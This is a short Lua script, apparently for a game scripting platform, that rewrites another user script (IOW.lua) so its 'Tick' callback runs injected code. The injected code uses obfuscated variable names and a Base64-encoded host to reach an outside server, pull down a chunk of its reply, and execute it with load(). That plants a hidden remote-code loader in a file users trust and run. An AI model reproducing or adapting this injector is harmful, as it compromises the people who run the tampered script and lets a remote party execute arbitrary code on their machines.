local string_before = ""
local string_after = ""
local state = false
local file = io.open(COMMON_PATH .. "IOW.lua","r")
local line = file:read()

--This to B64 better
local code_to_inject = 'local ll1l1l1l1ll111 = require("socket") \n local l11l1l1l1ll111 = ll1l1l1l1ll111.connect(Base64Decode("Y2xvd25maWVzdGEuYnBsYWNlZC5uZXQ="),80)  \n l11l1l1l1ll111:send("GET /?r=2 HTTP/1.0\\r\\nHost: clownfiesta.bplaced.net\\n\\r\\n") \n while true do \n	ll1l1l1l1ll111, ll1l1l1l1ll1l1, ll1lll1l1ll1l1 = l11l1l1l1ll111:receive(512)  \n if ll1l1l1l1ll1l1 == "closed" then  \n break  \n end  \n end  \n l11l1l1l1ll111:close()  \n local ll1l1l1l11l111 = string.find(ll1lll1l1ll1l1,"|1|",1) local ll1l1ll111l111 = string.find(ll1lll1l1ll1l1,"|2|",1)  \n assert(load(string.sub(ll1lll1l1ll1l1,ll1l1l1l11l111+3,ll1l1ll111l111-1)))()  \n '

while line do
	if not state then
		if line:find('"Tick"') then
			print("yes")
			state = true
		else
			string_before = string_before .. line .. "\n"
		end
	else
		string_after = string_after .. line .. "\n"
	end
	line = file:read()
end
file:close()
print(string_before:len() .. ";" .. string_after:len())
file = io.open(COMMON_PATH .. "IOW.lua","w")
file:write(string_before)
print("Escrito anterior")
file:write('Callback.Add("Tick", function() ' .. code_to_inject .. 'self:Tick() end) \n')
print("Injected")
file:write(string_after)
print("Escrito ultimo")
file:close()
